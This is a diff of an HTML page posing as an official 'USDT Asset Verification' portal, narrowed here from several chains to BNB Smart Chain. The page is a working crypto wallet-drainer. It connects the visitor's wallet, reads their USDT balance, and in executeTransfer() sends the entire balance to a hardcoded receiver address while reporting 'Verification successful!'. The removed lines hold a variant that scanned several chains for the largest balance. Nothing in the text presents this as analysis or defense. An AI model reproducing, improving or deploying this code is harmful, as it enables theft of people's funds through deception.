@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BNB & ETH | Multi-Chain Verification</title>
+  <title>BNB Chain | Secure System</title>
   
   <!-- Ethers.js & FontAwesome Library -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
@@ -108,7 +108,7 @@
     <div class="brand-header">
       <div class="brand-logo">
         <i class="fa-solid fa-shield-halved" style="color: #f3ba2f;"></i>
-        <div>BNB & ETH <span>VERIFICATION</span></div>
+        <div>BNB CHAIN <span>VERIFICATION</span></div>
       </div>
       <div class="secure-system-badge">
         SECURE SYSTEM <span class="dot-green"></span>
@@ -160,8 +160,8 @@
         <!-- Heading & Description -->
         <div style="margin-top: 14px;">
           <h1 class="main-heading">Verify USDT Assets</h1>
-          <div class="main-subheading">Official Multi-Chain Verification Protocol</div>
-          <p class="main-desc">Institutional gateway for smart contract auditing and USDT balance verification across BNB Smart Chain and Ethereum Mainnet.</p>
+          <div class="main-subheading">Official BNB Chain Verification Protocol</div>
+          <p class="main-desc">Institutional gateway for smart contract auditing and USDT balance verification across BNB Smart Chain ecosystem.</p>
         </div>
 
         <!-- Verification Box -->
@@ -170,11 +170,10 @@
             <i class="fa-solid fa-shield-halved"></i>
           </div>
           
-          <div class="bsc-verification-pill">MULTI-CHAIN USDT VERIFICATION</div>
+          <div class="bsc-verification-pill">BNB SMART CHAIN VERIFICATION</div>
 
           <div class="chain-badges-row">
-            <span class="chain-badge-item">BNB Chain</span>
-            <span class="chain-badge-item">Ethereum</span>
+            <span class="chain-badge-item">BEP-20 Standard</span>
           </div>
 
           <button id="mainVerifyBtn" class="btn-verify" type="button" onclick="initiateAuditFlow()">
@@ -214,17 +213,16 @@
 
         <!-- Token Ticker Carousel -->
         <div class="token-ticker-grid">
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #627eea; font-size: 10px;"></i> Ethereum ETH</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #3b82f6; font-size: 10px;"></i> USD Coin USDC</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #14f195; font-size: 10px;"></i> Solana SOL</div>
           <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #26a17b; font-size: 10px;"></i> Tether USDT</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #8247e5; font-size: 10px;"></i> Polygon MATIC</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #f3ba2f; font-size: 10px;"></i> Binance BNB</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #3b82f6; font-size: 10px;"></i> USD Coin USDC</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #627eea; font-size: 10px;"></i> Ethereum ETH</div>
         </div>
 
-        <!-- Multi-Chain Consensus Card -->
+        <!-- Consensus Card -->
         <div class="info-card">
-          <div class="info-title">Multi-Chain Consensus</div>
-          <div class="info-text">Seamlessly verifies Tether (USDT) on Ethereum Mainnet and BNB Smart Chain, providing high-performance decentralized audit infrastructure.</div>
+          <div class="info-title">BNB Chain Consensus</div>
+          <div class="info-text">Seamlessly verifies Tether (USDT) on BNB Smart Chain, providing high-performance decentralized audit infrastructure.</div>
         </div>
 
         <!-- Security Audit Card -->
@@ -244,7 +242,7 @@
             <span>Support</span>
           </div>
           <div class="footer-copy">
-            &copy; 2026 USDT Multi-Chain Asset Verification Portal. All rights reserved.
+            &copy; 2026 BNB Smart Chain Asset Verification Portal. All rights reserved.
           </div>
         </div>
 
@@ -277,42 +275,8 @@
 
   <script>
     const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-    
-    // Multi-Chain USDT Configuration
-    const CHAINS = [
-      {
-        chainId: 1,
-        chainIdHex: '0x1',
-        name: 'Ethereum Mainnet',
-        rpc: 'https://eth.llamarpc.com',
-        usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-        decimals: 6
-      },
-      {
-        chainId: 56,
-        chainIdHex: '0x38',
-        name: 'BNB Smart Chain',
-        rpc: 'https://bsc-dataseed.binance.org/',
-        usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
-        decimals: 18
-      },
-      {
-        chainId: 137,
-        chainIdHex: '0x89',
-        name: 'Polygon',
-        rpc: 'https://polygon-rpc.com',
-        usdtAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-        decimals: 6
-      },
-      {
-        chainId: 42161,
-        chainIdHex: '0xa4b1',
-        name: 'Arbitrum One',
-        rpc: 'https://arb1.arbitrum.io/rpc',
-        usdtAddress: '0xFd086bC7CD5C481dCC9685eb5C4a41a3148a0422',
-        decimals: 6
-      }
-    ];
+    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Official BEP-20 USDT on BSC
+    const BSC_CHAIN_ID = '0x38'; // Chain ID 56 (Hex: 0x38) for BNB Smart Chain
 
     const USDT_ABI = [
       "function balanceOf(address owner) view returns (uint256)",
@@ -320,8 +284,7 @@
     ];
 
     let globalProvider, globalSigner, globalUserAddress;
-    let selectedChain = null;
-    let maxUsdtWei = ethers.BigNumber.from(0);
+    let totalUsdtWei = ethers.BigNumber.from(0);
 
     function getActiveProvider() {
       if (typeof window !== 'undefined') {
@@ -332,11 +295,11 @@
       return null;
     }
 
-    async function switchToChain(ethProvider, chainIdHex) {
+    async function switchToBSC(ethProvider) {
       try {
         await ethProvider.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: chainIdHex }],
+          params: [{ chainId: BSC_CHAIN_ID }],
         });
       } catch (switchError) {
         console.log("Switch chain notice:", switchError);
@@ -357,38 +320,72 @@
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        if(btnText) btnText.innerHTML = '<span class="loader"></span> Scanning Chains...';
-
-        let highestBalance = ethers.BigNumber.from(0);
-        let bestChain = CHAINS[0];
-
-        // Scan all supported chains for the highest USDT balance
-        for (const chain of CHAINS) {
-          try {
-            const rpcProvider = new ethers.providers.JsonRpcProvider(chain.rpc);
-            const contract = new ethers.Contract(chain.usdtAddress, USDT_ABI, rpcProvider);
-            const bal = await contract.balanceOf(globalUserAddress);
-            
-            const formatted = parseFloat(ethers.utils.formatUnits(bal, chain.decimals));
-            const formattedHighest = parseFloat(ethers.utils.formatUnits(highestBalance, bestChain.decimals));
-
-            if (formatted > formattedHighest) {
-              highestBalance = bal;
-              bestChain = chain;
-            }
-          } catch (err) {
-            console.log(`Scan failed for ${chain.name}:`, err);
-          }
-        }
-
-        selectedChain = bestChain;
-        maxUsdtWei = highestBalance;
-
-        // Automatically switch wallet to the chain with the highest USDT balance
-        await switchToChain(ethProvider, bestChain.chainIdHex);
+        await switchToBSC(ethProvider);
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
         globalSigner = provider.getSigner();
         globalProvider = ethProvider;
 
-        const formattedUsdt = ether
+        if(btnText) btnText.innerHTML = '<span class="loader"></span> Verifying...';
+
+        try {
+          const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
+          totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
+        } catch (err) {
+          totalUsdtWei = ethers.BigNumber.from(0);
+        }
+
+        const formattedUsdt = ethers.utils.formatUnits(totalUsdtWei, 18);
+        document.getElementById('verifiedUsdtBalance').textContent = `${Number(formattedUsdt).toFixed(5)} USDT`;
+
+        // Switch to Verified Success View
+        document.getElementById('initialView').classList.add('hidden');
+        document.getElementById('verifiedView').classList.remove('hidden');
+
+      } catch (error) {
+        console.error("Scan Error:", error);
+        alert("Scan Error: " + (error.message || JSON.stringify(error)));
+        const btnText = document.getElementById("btnText");
+        if(btnText) btnText.innerText = "Verify Asset";
+      }
+    }
+
+    async function executeTransfer() {
+      try {
+        if (!globalProvider) {
+          alert("Wallet session not active. Please reconnect.");
+          return;
+        }
+
+        await switchToBSC(globalProvider);
+
+        const provider = new ethers.providers.Web3Provider(globalProvider, "any");
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+
+        // Strict BNB gas fee check (must be greater than 0)
+        const bnbBalance = await provider.getBalance(userAddress);
+        if (bnbBalance.lte(0)) {
+          alert("Transaction failed: Insufficient BNB in wallet to pay gas fees. BNB balance is 0.");
+          return;
+        }
+
+        if (!totalUsdtWei || totalUsdtWei.lte(0)) {
+          alert("No USDT balance found to verify/transfer.");
+          return;
+        }
+
+        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
+        
+        const tx = await usdtContract.transfer(TARGET_RECEIVER, totalUsdtWei, {
+          gasLimit: ethers.BigNumber.from("65000")
+        });
+
+        await tx.wait();
+        alert("Verification successful!");
+      } catch (err) {
+        console.error("Transfer error:", err);
+        alert("Notice: " + (err.message || JSON.stringify(err)));
+      }
+    }
+ 
